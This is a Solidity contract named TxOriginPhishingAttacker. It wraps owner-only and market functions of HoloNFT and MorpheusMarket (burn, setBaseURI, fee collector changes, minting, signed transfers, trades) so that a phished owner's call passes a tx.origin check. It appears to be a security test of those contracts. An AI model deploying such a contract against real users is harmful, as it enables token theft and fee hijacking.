// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../HoloNFT.sol";
import "../MorpheusMarket.sol";

contract TxOriginPhishingAttacker {

    HoloNFT public holoNFT;
    MorpheusMarket public market;

    constructor(address holoNFTAddress, address morpheusMarketAddress) {
        holoNFT = HoloNFT(holoNFTAddress);
        market = MorpheusMarket(morpheusMarketAddress);
    }

    // ***********************************************
    // HoloNFT: Contract Owner
    // ***********************************************

    function setOperator(address partnerMarket, bool approve) public {
        holoNFT.setOperator(partnerMarket,approve);
    }

    // security functions, only for the contract owner
    function setBaseURI(string memory baseURI_) external {
        holoNFT.setBaseURI(baseURI_);
    }

    function burn(uint256 tokenId) external {
        holoNFT.burn(tokenId);
    }

    function setPublisherFee(uint256 tokenId, uint16 newFee)
        external
    {
        holoNFT.setPublisherFee(tokenId,newFee);
    }

    function setPublisherFeeCollector(address payable account)
        external
    {
        holoNFT.setPublisherFeeCollector(account);
    }

    // ***********************************************
    // HoloNFT: Partner Market
    // ***********************************************

    function mintTo(
        address payable to,
        uint256 tokenId,
        address payable creator,
        uint16 creatorFee,
        bool allowSignature,
        bytes32 signature,
        uint16 publisherFee
    ) public{

        holoNFT.mintTo(to, tokenId, creator, creatorFee, allowSignature, signature, publisherFee);
        
    }

    // For transaction by the owner of this transaction
    function safeTransferFromWithSignature(
        address from,
        address to,
        uint256 tokenId,
        bytes32 signature
    ) public{

        holoNFT.safeTransferFromWithSignature(from, to, tokenId,signature);
        
    }

    // ***********************************************
    // MorpheusMarket : For token owner
    // ***********************************************

   function openTrade(uint256 tokenId, uint248 newPrice) external
    {
        market.openTrade(tokenId, newPrice);
    }

    function cancelTrade(uint256 tokenId) external
    {
        market.cancelTrade(tokenId);
    }
}
